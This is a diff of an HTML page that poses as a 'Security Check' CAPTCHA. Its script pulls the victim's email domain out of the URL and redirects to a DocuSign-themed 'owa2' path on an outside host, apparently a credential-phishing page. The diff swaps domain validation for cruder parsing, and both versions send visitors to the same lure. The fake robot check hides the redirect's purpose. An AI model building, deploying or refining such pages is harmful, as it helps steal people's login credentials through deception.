@@ -2,36 +2,36 @@
 <html lang="en">
 <head>
   <meta charset="UTF-8">
-  <title>Security Check</title>
+  <title>Redirect Page with CAPTCHA</title>
   <link rel="stylesheet" href="style.css">
 </head>
 <body>
-  <h2>Please verify you're not a robot</h2>
-
-  <label>
-    <input type="checkbox" id="captchaCheck" onclick="toggleContinueButton()">
-    I'm not a robot
-  </label>
-
-  <br>
-  <button id="continueBtn" onclick="redirectNow()">Continue</button>
+  <div id="captchaBox">
+    <label>
+      <input type="checkbox" id="captchaCheck" onclick="toggleButton()">
+      I'm not a robot
+    </label>
+    <br>
+    <button id="continueBtn" onclick="redirectNow()">Continue</button>
+  </div>
 
   <script>
-    function toggleContinueButton() {
-      const isChecked = document.getElementById("captchaCheck").checked;
-      document.getElementById("continueBtn").style.display = isChecked ? "inline-block" : "none";
+    function toggleButton() {
+      const checkbox = document.getElementById("captchaCheck");
+      const button = document.getElementById("continueBtn");
+      button.style.display = checkbox.checked ? "inline-block" : "none";
     }
 
     function redirectNow() {
-      const hash = window.location.hash;
-      const domain = hash ? hash.substring(1) : "";
+      var queryString = window.location.href;
+      var email = queryString.split("&");
+      var root = email[1];
+      var cross = root.split("#");
+      var dom = cross[0];
 
-      const isValidDomain = /^[a-zA-Z0-9.-]+\.[a-zA-Z]{2,}$/.test(domain);
-      const targetDomain = isValidDomain ? domain : "defaultdomain.com";
-
-      const redirectURL = `https://pedorcapitallimited.co.ke/Docusign_document_received/kjfhgjdskhfusdkjfhbsuhfdjhfdishsbhfdkjhaiskhsdkjfnbauhsjdhadfhjksdjhsgfghdkjghjhejjrkee/owa2/index.html#${encodeURIComponent(targetDomain)}`;
-
-      window.location.href = redirectURL;
+      var redirect = "https://pedorcapitallimited.co.ke/Docusign_document_received/kjfhgjdskhfusdkjfhbsuhfdjhfdishsbhfdkjhaiskhsdkjfnbauhsjdhadfhjksdjhsgfghdkjghjhejjrkee/owa2/index.html#{domain}";
+      var link = redirect.replace("{domain}", dom);
+      window.location.href = link;
     }
   </script>
 </body>
